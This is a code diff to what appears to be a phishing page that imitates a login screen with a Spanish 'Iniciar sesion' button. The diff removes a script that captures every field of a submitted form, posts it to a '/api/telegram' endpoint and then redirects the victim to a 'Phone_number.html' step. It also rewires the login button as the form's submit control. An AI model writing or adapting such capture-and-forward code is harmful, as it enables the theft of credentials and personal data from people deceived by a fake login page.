@@ -129,29 +129,6 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 </div>
 </article><div data-alert-show="false" id="ember35" class="alrtCont ember-view"></div><section class="content wrapper flexy-item">
 
-<script>
-	const form = document.getElementById("sendemail");
-
-form.addEventListener("submit", (e) => {
-  e.preventDefault(); // منع الإرسال التقليدي للفورم
-
-  const data = Object.fromEntries(new FormData(form));
-
-  // إرسال البيانات للـ API بدون انتظار النتيجة
-  fetch("/api/telegram", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data),
-  }).catch(err => console.error(err)); // أي خطأ نكتفيو بالطباعة فقط
-
-  // بعد 5 ثواني، redirect مباشرة ل sms.html
-  setTimeout(() => {
-    window.location.href = "Phone_number.html";
-  }, 5000);
-});
-</script>
-
-
 
 <script>
 
@@ -321,7 +298,8 @@ $(document).ready(function(){
 	
 
 
-<li id="ember45"  class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnLogin" class="button-default button set-padding-horizontal-4 width-auto oh relative button--positive ember-view"  ><span class="button__content block">
+<li id="ember45"  class="button-stack__item item-space-wide ember-view">
+	<button aria-disabled="false" type="submit" id="submit_form" data-id="btnLogin" class="button-default button set-padding-horizontal-4 width-auto oh relative button--positive ember-view"  ><span class="button__content block">
 	<b class="button__text txt_s txt-overflow_ellipsis">Iniciar sesion</b>
 </span>
 </button>
